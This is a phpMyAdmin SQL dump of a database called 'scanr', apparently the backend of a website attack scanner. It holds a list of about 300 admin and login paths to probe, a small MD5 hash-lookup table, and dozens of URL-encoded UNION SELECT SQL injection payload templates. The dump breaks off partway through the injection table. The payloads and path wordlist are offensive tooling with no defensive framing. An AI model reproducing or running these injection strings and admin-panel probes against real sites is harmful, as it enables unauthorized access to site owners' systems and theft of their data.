-- phpMyAdmin SQL Dump
-- version 3.3.9
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Feb 26, 2013 at 07:16 PM
-- Server version: 5.5.8
-- PHP Version: 5.3.5

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `scanr`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin_paths`
--

CREATE TABLE IF NOT EXISTS `admin_paths` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` text NOT NULL,
  `path` text NOT NULL,
  `added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=302 ;

--
-- Dumping data for table `admin_paths`
--

INSERT INTO `admin_paths` (`id`, `title`, `path`, `added`) VALUES
(1, 'WordPress', '/wp-admin/', '2013-02-20 14:48:53'),
(2, 'test', 'test', '2013-02-26 11:10:00'),
(3, 'unknown', 'admin.php', '2013-02-26 11:11:55'),
(4, 'unknown', 'login.htm', '2013-02-26 11:11:55'),
(5, 'unknown', 'login.html', '2013-02-26 11:11:55'),
(6, 'unknown', 'login/', '2013-02-26 11:11:55'),
(7, 'unknown', 'login.php', '2013-02-26 11:11:55'),
(8, 'unknown', 'adm/', '2013-02-26 11:11:55'),
(9, 'unknown', 'admin/', '2013-02-26 11:11:55'),
(10, 'unknown', 'admin/account.html', '2013-02-26 11:11:55'),
(11, 'unknown', 'admin/login.html', '2013-02-26 11:11:55'),
(12, 'unknown', 'admin/login.htm', '2013-02-26 11:11:55'),
(13, 'unknown', 'admin/home.php', '2013-02-26 11:11:55'),
(14, 'unknown', 'admin/controlpanel.html', '2013-02-26 11:11:55'),
(15, 'unknown', 'admin/controlpanel.htm', '2013-02-26 11:11:55'),
(16, 'unknown', 'admin/cp.php', '2013-02-26 11:11:55'),
(17, 'unknown', 'admin/adminLogin.html', '2013-02-26 11:11:55'),
(18, 'unknown', 'admin/adminLogin.htm', '2013-02-26 11:11:55'),
(19, 'unknown', 'admin/admin_login.php', '2013-02-26 11:11:55'),
(20, 'unknown', 'admin/controlpanel.php', '2013-02-26 11:11:55'),
(21, 'unknown', 'admin/admin-login.php', '2013-02-26 11:11:55'),
(22, 'unknown', 'admin-login.php', '2013-02-26 11:11:55'),
(23, 'unknown', 'admin/account.php', '2013-02-26 11:11:55'),
(24, 'unknown', 'admin/admin.php', '2013-02-26 11:11:55'),
(25, 'unknown', 'admin.htm', '2013-02-26 11:11:55'),
(26, 'unknown', 'admin.html', '2013-02-26 11:11:55'),
(27, 'unknown', 'adminitem/', '2013-02-26 11:11:55'),
(28, 'unknown', 'adminitem.php', '2013-02-26 11:11:55'),
(29, 'unknown', 'adminitems/', '2013-02-26 11:11:55'),
(30, 'unknown', 'adminitems.php', '2013-02-26 11:11:55'),
(31, 'unknown', 'administrator/', '2013-02-26 11:11:55'),
(32, 'unknown', 'administrator/login.php', '2013-02-26 11:11:55'),
(33, 'unknown', 'administrator.php', '2013-02-26 11:11:55'),
(34, 'unknown', 'administration/', '2013-02-26 11:11:55'),
(35, 'unknown', 'administration.php', '2013-02-26 11:11:55'),
(36, 'unknown', 'adminLogin/', '2013-02-26 11:11:55'),
(37, 'unknown', 'adminlogin.php', '2013-02-26 11:11:55'),
(38, 'unknown', 'admin_area/admin.php', '2013-02-26 11:11:55'),
(39, 'unknown', 'admin_area/', '2013-02-26 11:11:55'),
(40, 'unknown', 'admin_area/login.php', '2013-02-26 11:11:55'),
(41, 'unknown', 'manager/', '2013-02-26 11:11:55'),
(42, 'unknown', 'manager.php', '2013-02-26 11:11:55'),
(43, 'unknown', 'letmein/', '2013-02-26 11:11:55'),
(44, 'unknown', 'letmein.php', '2013-02-26 11:11:55'),
(45, 'unknown', 'superuser/', '2013-02-26 11:11:55'),
(46, 'unknown', 'superuser.php', '2013-02-26 11:11:55'),
(47, 'unknown', 'access/', '2013-02-26 11:11:55'),
(48, 'unknown', 'access.php', '2013-02-26 11:11:55'),
(49, 'unknown', 'sysadm/', '2013-02-26 11:11:55'),
(50, 'unknown', 'sysadm.php', '2013-02-26 11:11:55'),
(51, 'unknown', 'superman/', '2013-02-26 11:11:55'),
(52, 'unknown', 'supervisor/', '2013-02-26 11:11:55'),
(53, 'unknown', 'panel.php', '2013-02-26 11:11:55'),
(54, 'unknown', 'control/', '2013-02-26 11:11:55'),
(55, 'unknown', 'control.php', '2013-02-26 11:11:55'),
(56, 'unknown', 'member/', '2013-02-26 11:11:55'),
(57, 'unknown', 'member.php', '2013-02-26 11:11:55'),
(58, 'unknown', 'members/', '2013-02-26 11:11:55'),
(59, 'unknown', 'members.php', '2013-02-26 11:11:55'),
(60, 'unknown', 'user/', '2013-02-26 11:11:55'),
(61, 'unknown', 'user.php', '2013-02-26 11:11:55'),
(62, 'unknown', 'cp/', '2013-02-26 11:11:55'),
(63, 'unknown', 'uvpanel/', '2013-02-26 11:11:55'),
(64, 'unknown', 'manage/', '2013-02-26 11:11:55'),
(65, 'unknown', 'manage.php', '2013-02-26 11:11:55'),
(66, 'unknown', 'management/', '2013-02-26 11:11:55'),
(67, 'unknown', 'management.php', '2013-02-26 11:11:55'),
(68, 'unknown', 'signin/', '2013-02-26 11:11:55'),
(69, 'unknown', 'signin.php', '2013-02-26 11:11:55'),
(70, 'unknown', 'log-in/', '2013-02-26 11:11:55'),
(71, 'unknown', 'log-in.php', '2013-02-26 11:11:55'),
(72, 'unknown', 'log_in/', '2013-02-26 11:11:55'),
(73, 'unknown', 'log_in.php', '2013-02-26 11:11:55'),
(74, 'unknown', 'sign_in/', '2013-02-26 11:11:55'),
(75, 'unknown', 'sign_in.php', '2013-02-26 11:11:55'),
(76, 'unknown', 'sign-in/', '2013-02-26 11:11:55'),
(77, 'unknown', 'sign-in.php', '2013-02-26 11:11:55'),
(78, 'unknown', 'users/', '2013-02-26 11:11:55'),
(79, 'unknown', 'users.php', '2013-02-26 11:11:55'),
(80, 'unknown', 'accounts/', '2013-02-26 11:11:55'),
(81, 'unknown', 'accounts.php', '2013-02-26 11:11:55'),
(82, 'unknown', 'wp-login.php', '2013-02-26 11:11:55'),
(83, 'BBPress', 'bb-admin/login.php', '2013-02-26 11:15:08'),
(84, 'BBPress', 'bb-admin/admin.php', '2013-02-26 11:15:08'),
(85, 'BBPress', 'bb-admin/admin.html', '2013-02-26 11:15:08'),
(86, 'unknown', 'administrator/account.php', '2013-02-26 11:11:55'),
(87, 'unknown', 'relogin.htm', '2013-02-26 11:11:55'),
(88, 'unknown', 'relogin.html', '2013-02-26 11:11:55'),
(89, 'unknown', 'check.php', '2013-02-26 11:11:55'),
(90, 'unknown', 'relogin.php', '2013-02-26 11:11:55'),
(91, 'WordPress', 'blog/wp-login.php', '2013-02-26 11:15:34'),
(92, 'unknown', 'user/admin.php', '2013-02-26 11:11:55'),
(93, 'unknown', 'users/admin.php', '2013-02-26 11:11:55'),
(94, 'unknown', 'registration/', '2013-02-26 11:11:55'),
(95, 'unknown', 'processlogin.php', '2013-02-26 11:11:55'),
(96, 'unknown', 'checklogin.php', '2013-02-26 11:11:55'),
(97, 'unknown', 'checkuser.php', '2013-02-26 11:11:55'),
(98, 'unknown', 'checkadmin.php', '2013-02-26 11:11:55'),
(99, 'unknown', 'isadmin.php', '2013-02-26 11:11:55'),
(100, 'unknown', 'authenticate.php', '2013-02-26 11:11:55'),
(101, 'unknown', 'authentication.php', '2013-02-26 11:11:55'),
(102, 'unknown', 'auth.php', '2013-02-26 11:11:55'),
(103, 'unknown', 'authuser.php', '2013-02-26 11:11:55'),
(104, 'unknown', 'authadmin.php', '2013-02-26 11:11:55'),
(105, 'unknown', 'cp.php', '2013-02-26 11:11:55'),
(106, 'unknown', 'modelsearch/login.php', '2013-02-26 11:11:55'),
(107, 'unknown', 'moderator.php', '2013-02-26 11:11:55'),
(108, 'unknown', 'moderator/', '2013-02-26 11:11:55'),
(109, 'unknown', 'controlpanel/', '2013-02-26 11:11:55'),
(110, 'unknown', 'controlpanel.php', '2013-02-26 11:11:55'),
(111, 'unknown', 'admincontrol.php', '2013-02-26 11:11:55'),
(112, 'unknown', 'adminpanel.php', '2013-02-26 11:11:55'),
(113, 'unknown', 'fileadmin/', '2013-02-26 11:11:55'),
(114, 'unknown', 'fileadmin.php', '2013-02-26 11:11:55'),
(115, 'unknown', 'sysadmin.php', '2013-02-26 11:11:55'),
(116, 'unknown', 'admin1.php', '2013-02-26 11:11:55'),
(117, 'unknown', 'admin1.html', '2013-02-26 11:11:55'),
(118, 'unknown', 'admin1.htm', '2013-02-26 11:11:55'),
(119, 'unknown', 'admin2.php', '2013-02-26 11:11:55'),
(120, 'unknown', 'admin2.html', '2013-02-26 11:11:55'),
(121, 'unknown', 'yonetim.php', '2013-02-26 11:11:55'),
(122, 'unknown', 'yonetim.html', '2013-02-26 11:11:55'),
(123, 'unknown', 'yonetici.php', '2013-02-26 11:11:55'),
(124, 'unknown', 'yonetici.html', '2013-02-26 11:11:55'),
(125, 'unknown', 'phpmyadmin/', '2013-02-26 11:11:55'),
(126, 'unknown', 'myadmin/', '2013-02-26 11:11:55'),
(127, 'unknown', 'ur-admin.php', '2013-02-26 11:11:55'),
(128, 'unknown', 'ur-admin/', '2013-02-26 11:11:55'),
(129, 'unknown', 'Server.php', '2013-02-26 11:11:55'),
(130, 'unknown', 'Server/', '2013-02-26 11:11:55'),
(131, 'unknown', 'wp-admin/', '2013-02-26 11:11:55'),
(132, 'unknown', 'administr8.php', '2013-02-26 11:11:55'),
(133, 'unknown', 'administr8/', '2013-02-26 11:11:55'),
(134, 'unknown', 'webadmin/', '2013-02-26 11:11:55'),
(135, 'unknown', 'webadmin.php', '2013-02-26 11:11:55'),
(136, 'unknown', 'administratie/', '2013-02-26 11:11:55'),
(137, 'unknown', 'admins/', '2013-02-26 11:11:55'),
(138, 'unknown', 'admins.php', '2013-02-26 11:11:55'),
(139, 'unknown', 'administrivia/', '2013-02-26 11:11:55'),
(140, 'unknown', 'Database_Administration/', '2013-02-26 11:11:55'),
(141, 'unknown', 'useradmin/', '2013-02-26 11:11:55'),
(142, 'unknown', 'sysadmins/', '2013-02-26 11:11:55'),
(143, 'unknown', 'admin1/', '2013-02-26 11:11:55'),
(144, 'unknown', 'system-administration/', '2013-02-26 11:11:55'),
(145, 'unknown', 'administrators/', '2013-02-26 11:11:55'),
(146, 'unknown', 'pgadmin/', '2013-02-26 11:11:55'),
(147, 'unknown', 'directadmin/', '2013-02-26 11:11:55'),
(148, 'unknown', 'staradmin/', '2013-02-26 11:11:55'),
(149, 'unknown', 'ServerAdministrator/', '2013-02-26 11:11:55'),
(150, 'unknown', 'SysAdmin/', '2013-02-26 11:11:55'),
(151, 'unknown', 'administer/', '2013-02-26 11:11:55'),
(152, 'unknown', 'LiveUser_Admin/', '2013-02-26 11:11:55'),
(153, 'unknown', 'sys-admin/', '2013-02-26 11:11:55'),
(154, 'unknown', 'typo3/', '2013-02-26 11:11:55'),
(155, 'unknown', 'panel/', '2013-02-26 11:11:55'),
(156, 'unknown', 'cpanel/', '2013-02-26 11:11:55'),
(157, 'unknown', 'cpanel_file/', '2013-02-26 11:11:55'),
(158, 'unknown', 'platz_login/', '2013-02-26 11:11:55'),
(159, 'unknown', 'rcLogin/', '2013-02-26 11:11:55'),
(160, 'unknown', 'blogindex/', '2013-02-26 11:11:55'),
(161, 'unknown', 'formslogin/', '2013-02-26 11:11:55'),
(162, 'unknown', 'autologin/', '2013-02-26 11:11:55'),
(163, 'unknown', 'support_login/', '2013-02-26 11:11:55'),
(164, 'unknown', 'meta_login/', '2013-02-26 11:11:55'),
(165, 'unknown', 'manuallogin/', '2013-02-26 11:11:55'),
(166, 'unknown', 'simpleLogin/', '2013-02-26 11:11:55'),
(167, 'unknown', 'loginflat/', '2013-02-26 11:11:55'),
(168, 'unknown', 'utility_login/', '2013-02-26 11:11:55'),
(169, 'unknown', 'showlogin/', '2013-02-26 11:11:55'),
(170, 'unknown', 'memlogin/', '2013-02-26 11:11:55'),
(171, 'unknown', 'login-redirect/', '2013-02-26 11:11:55'),
(172, 'unknown', 'sub-login/', '2013-02-26 11:11:55'),
(173, 'unknown', 'wp-login/', '2013-02-26 11:11:55'),
(174, 'unknown', 'login1/', '2013-02-26 11:11:55'),
(175, 'unknown', 'dir-login/', '2013-02-26 11:11:55'),
(176, 'unknown', 'login_db/', '2013-02-26 11:11:55'),
(177, 'unknown', 'xlogin/', '2013-02-26 11:11:55'),
(178, 'unknown', 'smblogin/', '2013-02-26 11:11:55'),
(179, 'unknown', 'customer_login/', '2013-02-26 11:11:55'),
(180, 'unknown', 'UserLogin/', '2013-02-26 11:11:55'),
(181, 'unknown', 'login-us/', '2013-02-26 11:11:55'),
(182, 'unknown', 'acct_login/', '2013-02-26 11:11:55'),
(183, 'unknown', 'bigadmin/', '2013-02-26 11:11:55'),
(184, 'unknown', 'project-admins/', '2013-02-26 11:11:55'),
(185, 'unknown', 'phppgadmin/', '2013-02-26 11:11:55'),
(186, 'unknown', 'pureadmin/', '2013-02-26 11:11:55'),
(187, 'unknown', 'sql-admin/', '2013-02-26 11:11:55'),
(188, 'unknown', 'radmind/', '2013-02-26 11:11:55'),
(189, 'unknown', 'openvpnadmin/', '2013-02-26 11:11:55'),
(190, 'unknown', 'wizmysqladmin/', '2013-02-26 11:11:55'),
(191, 'unknown', 'vadmind/', '2013-02-26 11:11:55'),
(192, 'unknown', 'ezsqliteadmin/', '2013-02-26 11:11:55'),
(193, 'unknown', 'hpwebjetadmin/', '2013-02-26 11:11:55'),
(194, 'unknown', 'newsadmin/', '2013-02-26 11:11:55'),
(195, 'unknown', 'adminpro/', '2013-02-26 11:11:55'),
(196, 'unknown', 'Lotus_Domino_Admin/', '2013-02-26 11:11:55'),
(197, 'unknown', 'bbadmin/', '2013-02-26 11:11:55'),
(198, 'unknown', 'vmailadmin/', '2013-02-26 11:11:55'),
(199, 'unknown', 'Indy_admin/', '2013-02-26 11:11:55'),
(200, 'unknown', 'ccp14admin/', '2013-02-26 11:11:55'),
(201, 'unknown', 'irc-macadmin/', '2013-02-26 11:11:55'),
(202, 'unknown', 'banneradmin/', '2013-02-26 11:11:55'),
(203, 'unknown', 'sshadmin/', '2013-02-26 11:11:55'),
(204, 'unknown', 'phpldapadmin/', '2013-02-26 11:11:55'),
(205, 'unknown', 'macadmin/', '2013-02-26 11:11:55'),
(206, 'unknown', 'administratoraccounts/', '2013-02-26 11:11:55'),
(207, 'unknown', 'admin4_account/', '2013-02-26 11:11:55'),
(208, 'unknown', 'admin4_colon/', '2013-02-26 11:11:55'),
(209, 'unknown', 'radmind-1/', '2013-02-26 11:11:55'),
(210, 'unknown', 'Super-Admin/', '2013-02-26 11:11:55'),
(211, 'unknown', 'AdminTools/', '2013-02-26 11:11:55'),
(212, 'unknown', 'cmsadmin/', '2013-02-26 11:11:55'),
(213, 'unknown', 'SysAdmin2/', '2013-02-26 11:11:55'),
(214, 'unknown', 'globes_admin/', '2013-02-26 11:11:55'),
(215, 'unknown', 'cadmins/', '2013-02-26 11:11:55'),
(216, 'unknown', 'phpSQLiteAdmin/', '2013-02-26 11:11:55'),
(217, 'unknown', 'navSiteAdmin/', '2013-02-26 11:11:55'),
(218, 'unknown', 'server_admin_small/', '2013-02-26 11:11:55'),
(219, 'unknown', 'logo_sysadmin/', '2013-02-26 11:11:55'),
(220, 'unknown', 'power_user/', '2013-02-26 11:11:55'),
(221, 'unknown', 'system_administration/', '2013-02-26 11:11:55'),
(222, 'unknown', 'ss_vms_admin_sm/', '2013-02-26 11:11:55'),
(223, 'unknown', 'bb-admin/', '2013-02-26 11:11:55'),
(224, 'unknown', 'panel-administracion/', '2013-02-26 11:11:55'),
(225, 'unknown', 'instadmin/', '2013-02-26 11:11:55'),
(226, 'unknown', 'memberadmin/', '2013-02-26 11:11:55'),
(227, 'unknown', 'administratorlogin/', '2013-02-26 11:11:55'),
(228, 'unknown', 'adm.php', '2013-02-26 11:11:55'),
(229, 'unknown', 'admin_login.php', '2013-02-26 11:11:55'),
(230, 'unknown', 'panel-administracion/login.php', '2013-02-26 11:11:55'),
(231, 'unknown', 'pages/admin/admin-login.php', '2013-02-26 11:11:55'),
(232, 'unknown', 'pages/admin/', '2013-02-26 11:11:55'),
(233, 'unknown', 'acceso.php', '2013-02-26 11:11:55'),
(234, 'unknown', 'admincp/login.php', '2013-02-26 11:11:55'),
(235, 'unknown', 'admincp/', '2013-02-26 11:11:55'),
(236, 'unknown', 'adminarea/', '2013-02-26 11:11:55'),
(237, 'unknown', 'admincontrol/', '2013-02-26 11:11:55'),
(238, 'unknown', 'affiliate.php', '2013-02-26 11:11:55'),
(239, 'unknown', 'adm_auth.php', '2013-02-26 11:11:55'),
(240, 'unknown', 'memberadmin.php', '2013-02-26 11:11:55'),
(241, 'unknown', 'administratorlogin.php', '2013-02-26 11:11:55'),
(242, 'unknown', 'modules/admin/', '2013-02-26 11:11:55'),
(243, 'unknown', 'administrators.php', '2013-02-26 11:11:55'),
(244, 'unknown', 'siteadmin/', '2013-02-26 11:11:55'),
(245, 'unknown', 'siteadmin.php', '2013-02-26 11:11:55'),
(246, 'unknown', 'adminsite/', '2013-02-26 11:11:55'),
(247, 'unknown', 'kpanel/', '2013-02-26 11:11:55'),
(248, 'unknown', 'vorod/', '2013-02-26 11:11:55'),
(249, 'unknown', 'vorod.php', '2013-02-26 11:11:55'),
(250, 'unknown', 'vorud/', '2013-02-26 11:11:55'),
(251, 'unknown', 'vorud.php', '2013-02-26 11:11:55'),
(252, 'unknown', 'adminpanel/', '2013-02-26 11:11:55'),
(253, 'unknown', 'PSUser/', '2013-02-26 11:11:55'),
(254, 'unknown', 'secure/', '2013-02-26 11:11:55'),
(255, 'unknown', 'webmaster/', '2013-02-26 11:11:55'),
(256, 'unknown', 'webmaster.php', '2013-02-26 11:11:55'),
(257, 'unknown', 'autologin.php', '2013-02-26 11:11:55'),
(258, 'unknown', 'userlogin.php', '2013-02-26 11:11:55'),
(259, 'unknown', 'admin_area.php', '2013-02-26 11:11:55'),
(260, 'unknown', 'cmsadmin.php', '2013-02-26 11:11:55'),
(261, 'unknown', 'security/', '2013-02-26 11:11:55'),
(262, 'unknown', 'usr/', '2013-02-26 11:11:55'),
(263, 'unknown', 'root/', '2013-02-26 11:11:55'),
(264, 'unknown', 'secret/', '2013-02-26 11:11:55'),
(265, 'unknown', 'admin/login.php', '2013-02-26 11:11:55'),
(266, 'unknown', 'admin/adminLogin.php', '2013-02-26 11:11:55'),
(267, 'unknown', 'moderator.php', '2013-02-26 11:11:55'),
(268, 'unknown', 'moderator.html', '2013-02-26 11:11:55'),
(269, 'unknown', 'moderator/login.php', '2013-02-26 11:11:55'),
(270, 'unknown', 'moderator/admin.php', '2013-02-26 11:11:55'),
(271, 'unknown', 'yonetici.php', '2013-02-26 11:11:55'),
(272, 'unknown', '0admin/', '2013-02-26 11:11:55'),
(273, 'unknown', '0manager/', '2013-02-26 11:11:55'),
(274, 'unknown', 'aadmin/', '2013-02-26 11:11:55'),
(275, 'unknown', 'cgi-bin/loginphp', '2013-02-26 11:11:55'),
(276, 'unknown', 'login1php', '2013-02-26 11:11:55'),
(277, 'unknown', 'login_admin/', '2013-02-26 11:11:55'),
(278, 'unknown', 'login_adminphp', '2013-02-26 11:11:55'),
(279, 'unknown', 'login_out/', '2013-02-26 11:11:55'),
(280, 'unknown', 'login_outphp', '2013-02-26 11:11:55'),
(281, 'unknown', 'login_userphp', '2013-02-26 11:11:55'),
(282, 'unknown', 'loginerror/', '2013-02-26 11:11:55'),
(283, 'unknown', 'loginok/', '2013-02-26 11:11:55'),
(284, 'unknown', 'loginsave/', '2013-02-26 11:11:55'),
(285, 'unknown', 'loginsuper/', '2013-02-26 11:11:55'),
(286, 'unknown', 'loginsuperphp', '2013-02-26 11:11:55'),
(287, 'unknown', 'loginphp', '2013-02-26 11:11:55'),
(288, 'unknown', 'logout/', '2013-02-26 11:11:55'),
(289, 'unknown', 'logoutphp', '2013-02-26 11:11:55'),
(290, 'unknown', 'secrets/', '2013-02-26 11:11:55'),
(291, 'unknown', 'super1/', '2013-02-26 11:11:55'),
(292, 'unknown', 'super1php', '2013-02-26 11:11:55'),
(293, 'unknown', 'super_indexphp', '2013-02-26 11:11:55'),
(294, 'unknown', 'super_loginphp', '2013-02-26 11:11:55'),
(295, 'unknown', 'supermanagerphp', '2013-02-26 11:11:55'),
(296, 'unknown', 'supermanphp', '2013-02-26 11:11:55'),
(297, 'unknown', 'superuserphp', '2013-02-26 11:11:55'),
(298, 'unknown', 'supervise/', '2013-02-26 11:11:55'),
(299, 'unknown', 'supervise/Loginphp', '2013-02-26 11:11:55'),
(300, 'unknown', 'superphp', '2013-02-26 11:11:55'),
(301, 'unknown', 'fw-panel', '2013-02-26 11:11:55');

-- --------------------------------------------------------

--
-- Table structure for table `md5_hashes`
--

CREATE TABLE IF NOT EXISTS `md5_hashes` (
  `id` int(99) NOT NULL AUTO_INCREMENT,
  `word` text NOT NULL,
  `hash` varchar(32) NOT NULL,
  `added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `md5_hashes`
--

INSERT INTO `md5_hashes` (`id`, `word`, `hash`, `added`) VALUES
(1, 'test', '098f6bcd4621d373cade4e832627b4f6', '2013-02-20 16:28:32'),
(2, 'freedom', 'd5aa1729c8c253e5d917a5264855eab8', '2013-02-20 16:33:18');

-- --------------------------------------------------------

--
-- Table structure for table `sql_strings`
--

CREATE TABLE IF NOT EXISTS `sql_strings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `string` text NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=114 ;

--
-- Dumping data for table `sql_strings`
--

INSERT INTO `sql_strings` (`id`, `string`, `date`) VALUES
(1, '%20-6863%20union%20all%20select%20''.$payload_union.''%23', '2013-02-22 10:04:29'),
(2, '%20-6863%20union%20all%20select%201,''.$payload_union.''%23', '2013-02-22 10:04:45'),
(3, '%20-6863%20union%20all%20select%20[payload]%23', '2013-02-22 10:09:52'),
(4, '%20-6863%20union%20all%20select%20[payload]%23', '2013-02-22 10:10:36'),
(5, '%20-6863%20union%20all%20select%201,[payload]%23', '2013-02-22 10:10:36'),
(6, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(7, '%20-6863%20union%20all%20select%201,1,[payload]%23', '2013-02-22 10:10:36'),
(8, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(9, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(10, '%20-6863%20union%20all%20select%201,1,1,[payload]%23', '2013-02-22 10:10:36'),
(11, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(12, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(13, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(14, '%20-6863%20union%20all%20select%201,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(15, '%20-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(16, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(17, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(18, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(19, '%20-6863%20union%20all%20select%201,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(20, '%20-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(21, '%20-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(22, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(23, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(24, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(25, '%20-6863%20union%20all%20select%201,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(26, '%20-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(27, '%20-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(28, '%20-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(29, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(30, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(31, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(32, '%20-6863%20union%20all%20select%201,1,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(33, '%20-6863%20union%20all%20select%201,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(34, '%20-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(35, '%20-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(36, '%20-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(37, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(38, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(39, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(40, '%20-6863%20union%20all%20select%201,1,1,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(41, '%20-6863%20union%20all%20select%201,1,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(42, '%20-6863%20union%20all%20select%201,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(43, '%20-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(44, '%20-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(45, '%20-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(46, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(47, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(48, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(49, '%20-6863%20union%20all%20select%201,1,1,1,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(50, '%20-6863%20union%20all%20select%201,1,1,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(51, '%20-6863%20union%20all%20select%201,1,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(52, '%20-6863%20union%20all%20select%201,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(53, '%20-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(54, '%20-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(55, '%20-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(56, '%20-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
